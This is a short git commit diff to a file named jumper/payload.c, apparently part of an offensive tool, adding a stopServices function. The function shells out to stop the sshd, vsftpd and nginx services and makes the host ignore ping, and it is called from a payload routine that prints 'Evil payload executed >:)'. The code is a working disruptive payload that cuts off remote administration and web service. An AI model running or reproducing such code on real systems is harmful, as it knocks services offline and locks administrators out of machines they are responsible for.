458b36874eb3401a7ea838f8b7bb81bcdb2c3ee5
MdbookTech <michael@mdbooktech.com>
2022-02-22 08:41:07 -0500

    Added stopServices

--- jumper/payload.c
+++ jumper/payload.c
@@ -1,5 +1,14 @@
+void stopServices(){
+    system("systemctl stop sshd");
+    system("systemctl stop vsftpd");
+    system("systemctl stop nginx");
+    system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all");
+}
+
+
 int payload(){
     printf("Evil payload executed >:)\n");
+    stopServices();
     //Execute whatever the hell you want here
     return 0;
 }
